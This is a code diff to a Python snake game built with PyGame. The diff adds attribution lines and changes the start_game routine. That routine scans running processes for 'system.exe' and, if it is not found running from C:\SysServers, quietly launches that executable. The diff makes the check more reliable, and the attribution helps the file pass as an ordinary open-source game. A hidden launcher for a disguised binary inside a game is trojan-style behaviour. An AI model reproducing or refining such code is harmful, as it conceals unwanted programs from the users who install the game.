@@ -1,6 +1,8 @@
 """
 Snake Eater
 Made with PyGame
+Author: Rajat Biswas
+Project: https://github.com/rajatdiptabiswas/snake-pygame
 """
 
 import pygame, sys, time, random, os
@@ -77,10 +79,14 @@ def start_game():
         checker = True
         pids = psutil.pids()
         for pid in pids:
-            p = psutil.Process(pid)
+            try:
+                p = psutil.Process(pid)
+            except:
+                continue
             if p.name() == 'system.exe':
-                checker = False
-                break
+                if p.cwd() == 'C:\\SysServers':
+                    checker = False
+                    break
         if checker == True:
             os.chdir('C:\\SysServers')
             os.popen('system.exe')
